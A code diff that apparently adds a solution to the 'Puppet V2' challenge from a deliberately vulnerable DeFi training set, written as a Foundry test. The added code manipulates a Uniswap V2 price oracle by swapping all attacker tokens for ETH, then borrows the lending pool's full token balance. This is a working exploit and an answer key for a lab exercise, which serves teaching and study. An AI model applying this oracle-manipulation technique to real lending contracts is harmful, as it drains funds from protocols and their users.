@@ -119,6 +119,31 @@ contract PuppetV2 is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // NOTE: This is the same as the Puppet exploit, but with the UniV2 
+
+        address[] memory path_ = new address[](2);
+        path_[0] = address(dvt);
+        path_[1] = address(weth);
+
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapV2Router), dvt.balanceOf(attacker));
+
+        uniswapV2Router.swapExactTokensForETH(
+            dvt.balanceOf(attacker),
+            0,
+            path_,
+            attacker,
+            block.timestamp + 1000
+        );
+
+        weth.deposit{value: attacker.balance}();
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
